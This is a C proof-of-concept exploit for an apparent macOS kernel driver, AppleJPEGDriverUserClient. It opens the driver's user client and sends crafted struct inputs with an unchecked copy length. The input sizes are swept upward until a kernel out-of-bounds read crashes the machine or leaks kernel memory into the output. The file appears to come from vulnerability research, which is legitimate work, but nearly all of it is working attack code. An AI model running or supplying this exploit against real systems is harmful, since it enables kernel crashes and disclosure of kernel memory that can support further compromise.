// applejpeg_poc.c — AppleJPEGDriverUserClient sel 5 (startDecoderExt) / sel 7 (startDecoder2024)
// Codex static lead: attacker length at input+0x7c, no bound, memmove(dst, input+0x84, len) into a
// kernel vector. len > (structIn - 0x84) => OOB read of adjacent KERNEL memory.
//   sel5 structIn=0x1000 -> safe edge len 0xf7c
//   sel7 structIn=0x0da0 -> safe edge len 0xd1c
// Watch: (a) panic at large len (read crosses guard page) = real kernel crash;
//        (b) over-read bytes surfacing in structOut = DISCLOSURE (the bar for an OOB read).
// VM-ONLY. Persistent pre-call log (fsync) for panic attribution.
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>

#define LOG "/Users/test/jpeg_poc_inflight.txt"
static void logline(const char*s){int fd=open(LOG,O_WRONLY|O_CREAT|O_TRUNC,0644);if(fd>=0){(void)!write(fd,s,strlen(s));fsync(fd);close(fd);}}

static io_connect_t open_jpeg(void){
  const char*cands[]={"AppleJPEGDriver","AppleJPEGDriverUserClient","IOJPEGDecodeDriver","AppleJPEG",NULL};
  for(int i=0;cands[i];i++){
    io_iterator_t it; CFMutableDictionaryRef m=IOServiceMatching(cands[i]); if(!m)continue;
    if(IOServiceGetMatchingServices(kIOMainPortDefault,m,&it)!=KERN_SUCCESS)continue;
    io_service_t svc;
    while((svc=IOIteratorNext(it))){
      for(int t=0;t<=4;t++){ io_connect_t c=0;
        kern_return_t kr=IOServiceOpen(svc,mach_task_self(),(uint32_t)t,&c);
        if(kr==KERN_SUCCESS&&c){ fprintf(stderr,"[+] opened %s type=%d conn=0x%x (uid=%d)\n",cands[i],t,c,getuid());
          IOObjectRelease(svc);IOObjectRelease(it); return c; }
      }
      IOObjectRelease(svc);
    }
    IOObjectRelease(it);
  }
  return 0;
}

// count trailing/!=0 bytes in out tail to spot leaked kernel data; print last 48 bytes hex
static void inspect_out(const char*tag,uint8_t*out,size_t n){
  size_t nz=0; for(size_t i=0;i<n;i++) if(out[i]) nz++;
  fprintf(stderr,"    [out %s] nonzero=%zu/%zu tail48=",tag,nz,n);
  size_t s=n>48?n-48:0; for(size_t i=s;i<n;i++) fprintf(stderr,"%02x",out[i]); fprintf(stderr,"\n");
}

static void run_sel(io_connect_t c,int sel,size_t inSize,uint32_t branch){
  // push far past the buffer end so the src over-read crosses into unmapped kernel pages (guard-page panic)
  uint32_t lens5[]={0xf7c,0x1000,0x4000,0x10000,0x100000,0x400000,0x1000000,0x4000000,0x10000000};
  uint32_t lens7[]={0xd1c,0xda0,0x4000,0x10000,0x100000,0x400000,0x1000000,0x4000000,0x10000000};
  uint32_t *lens = (sel==5)?lens5:lens7;
  for(int i=0;i<9;i++){
    uint8_t *in=calloc(1,inSize); uint8_t out[0x1000]; size_t outLen=inSize;
    memset(in,0,inSize); memset(out,0,sizeof out);   // zero out -> any nonzero is KERNEL-written, not stack garbage
    *(uint64_t*)(in+0x30)=branch;      // 1 = take vulnerable copy branch; 0 = control
    *(uint32_t*)(in+0x2c)=0;            // normal sampling mode
    *(uint32_t*)(in+0x7c)=lens[i];      // copy length (unchecked)
    char lg[160]; snprintf(lg,sizeof lg,"sel%d branch=%u len=0x%x\n",sel,branch,lens[i]); logline(lg);
    kern_return_t kr=IOConnectCallStructMethod(c,(uint32_t)sel,in,inSize,out,&outLen);
    fprintf(stderr,"[sel%d branch=%u len=0x%-6x] kr=0x%x outLen=%zu\n",sel,branch,lens[i],kr,outLen);
    if(branch && outLen) inspect_out("",out,outLen<sizeof out?outLen:sizeof out);
    free(in);
  }
}

int main(int argc,char**argv){
  setvbuf(stderr,NULL,_IONBF,0);
  if(argc>1 && !strcmp(argv[1],"probe")){      // SAFE: open+close only, no method calls
    io_connect_t c=open_jpeg();
    if(!c){ fprintf(stderr,"[!] no AppleJPEGDriver UC openable (uid=%d)\n",getuid()); return 2; }
    fprintf(stderr,"[probe] REACHABLE, no method calls issued. closing.\n"); IOServiceClose(c); return 0;
  }
  io_connect_t c=open_jpeg();
  if(!c){ fprintf(stderr,"[!] no AppleJPEGDriver UC openable (uid=%d)\n",getuid()); return 2; }
  // Codex discriminator: sel 0/2 are no-op wrappers -> return 0 if dispatch reaches wrappers.
  // sel0/2==0 while sel5/7==0xe00002cc  => copy site IS reached, status is downstream (PROCEED).
  // sel0/2==0xe00002cc too               => default-locking fails before wrapper (copy NOT reached).
  { uint8_t z[0x1000]={0}; uint8_t o[0x1000]; size_t ol;
    ol=sizeof o; kern_return_t k0=IOConnectCallStructMethod(c,0,z,0x1000,o,&ol);
    ol=sizeof o; kern_return_t k2=IOConnectCallStructMethod(c,2,z,0x1000,o,&ol);
    fprintf(stderr,"[confirm] sel0(no-op)=0x%x sel2(no-op)=0x%x  -> %s\n",k0,k2,
      (k0==0||k2==0)?"wrappers reached; treat sel5/7 copy as REACHED":"default-lock fails pre-wrapper"); }
  int sel=(argc>1)?atoi(argv[1]):5;
  size_t inSize=(sel==5)?0x1000:0xda0;
  fprintf(stderr,"=== sel %d VULN branch (over-read sweep) ===\n",sel);
  run_sel(c,sel,inSize,1);
  fprintf(stderr,"=== sel %d CONTROL branch (in+0x30=0, copy should not happen) ===\n",sel);
  run_sel(c,sel,inSize,0);
  logline("DONE-clean\n");
  fprintf(stderr,"[*] completed without panic\n");
  IOServiceClose(c);
  return 0;
}
